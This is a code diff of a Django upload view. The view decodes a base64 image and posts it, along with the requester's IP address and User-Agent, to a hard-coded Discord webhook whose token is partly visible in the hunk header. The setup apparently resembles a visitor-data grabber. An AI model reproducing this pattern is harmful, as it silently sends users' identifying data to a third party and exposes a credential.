@@ -12,39 +12,37 @@ DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1312712494082691134/dyrj
 def upload_image(request):
     if request.method == 'POST':
         try:
-            # Parse the request data
             data = json.loads(request.body)
-            image_data = data.get('image', '').split(',')[1]  # Remove 'data:image/png;base64,' prefix
+            image_data = data.get('image', '').split(',')[1]
             image_bytes = base64.b64decode(image_data)
 
-            # Save the image temporarily
+            # Save image temporarily
             image_path = 'temp_image.png'
             with open(image_path, 'wb') as image_file:
                 image_file.write(image_bytes)
 
-            # Get IP address
-            ip_address = get_client_ip(request)
+            # Debug file creation
+            if not os.path.exists(image_path) or os.path.getsize(image_path) == 0:
+                raise ValueError("Image file creation failed or file is empty.")
 
-            # Get User-Agent (browser info)
-            user_agent = request.META.get('HTTP_USER_AGENT', 'Unknown')
-
-            # Send image and metadata to Discord
+            # Send image to Discord
             with open(image_path, 'rb') as img:
                 response = requests.post(
                     DISCORD_WEBHOOK_URL,
                     files={'file': img},
                     data={
-                        'content': f"New upload received:\nIP Address: {ip_address}\nUser-Agent: {user_agent}"
+                        'content': f"New upload received:\nIP Address: {get_client_ip(request)}\nUser-Agent: {request.META.get('HTTP_USER_AGENT', 'Unknown')}"
                     }
                 )
 
-            # Clean up temporary image
+            # Clean up temporary file
             os.remove(image_path)
 
+            # Handle Discord response
             if response.status_code == 204:
                 return JsonResponse({'message': 'Image and metadata sent to Discord successfully!'})
             else:
-                return JsonResponse({'message': 'Failed to send data to Discord.'}, status=500)
+                return JsonResponse({'message': f'Failed to send data to Discord. Response: {response.text}'}, status=500)
 
         except Exception as e:
             return JsonResponse({'message': f'Error: {str(e)}'}, status=500)
